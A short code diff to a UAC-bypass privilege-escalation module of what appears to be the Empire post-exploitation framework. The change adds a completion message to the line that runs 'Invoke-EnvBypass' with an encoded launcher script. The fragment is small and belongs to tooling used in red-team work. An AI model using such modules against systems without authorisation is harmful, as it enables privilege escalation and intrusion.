+++ empire/server/modules/powershell/privesc/bypassuac_env.py
@@ -50,7 +50,7 @@ class Module:
         if launcher == "":
             return handle_error_message("[!] Error in launcher generation.")
 
-        script_end = f'Invoke-EnvBypass -Command "{enc_script}"'
+        script_end = f'Invoke-EnvBypass -Command "{enc_script}"; "Invoke-EnvBypass completed"'
         return main_menu.modulesv2.finalize_module(
             script=script,
             script_end=script_end,